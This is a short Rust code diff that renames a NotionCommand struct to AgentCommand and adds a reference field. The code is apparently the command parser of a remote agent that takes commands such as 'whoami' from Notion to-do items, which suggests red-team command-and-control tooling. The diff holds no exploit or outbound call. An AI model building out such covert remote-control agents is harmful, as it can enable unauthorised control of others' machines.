@@ -77,7 +77,7 @@ pub enum CommandType {
     Unknown
 }
 
-/// Simple errors for the construction of a NotionCommand.
+/// Simple errors for the construction of a AgentCommand.
 /// Returned if construction fails.
 #[derive(Debug)]
 pub struct CommandError(String);
@@ -161,14 +161,18 @@ impl Iterator for CommandArgs {
 
 
 /// The command itself, containing the `CommandType` enum
-pub struct NotionCommand {
+/// The `rel` attribute is used to contain any reference back to parent objects
+/// that might be necessary. For example, [NotionChannel] will use this to store block ids.
+///  
+pub struct AgentCommand {
     pub command_type: CommandType,
-    pub args: CommandArgs
+    pub args: CommandArgs,
+    pub rel: String
 }
 
-impl NotionCommand {
-    /// Constructor for `NotionCommands`. Takes the raw string from the `to_do`.
-    pub fn from_string(command_str: String) -> Result<NotionCommand, CommandError> {
+impl AgentCommand {
+    /// Constructor for `AgentCommands`. Takes the raw string from the `to_do`.
+    pub fn from_string(command_str: String) -> Result<AgentCommand, CommandError> {
         let mut command_words = command_str.split(" ");
         // Taking the first command advances the iterator, so the remaining 
         // items should be the command data.
@@ -203,7 +207,7 @@ impl NotionCommand {
                 "whoami"       => CommandType::Whoami,
                 _              => CommandType::Unknown,
             };
-            return Ok(NotionCommand { command_type: command_type, args: command_args});
+            return Ok(AgentCommand { command_type: command_type, args: command_args});
 
         } else {
             Err(CommandError("Could not parse command!".to_string()))
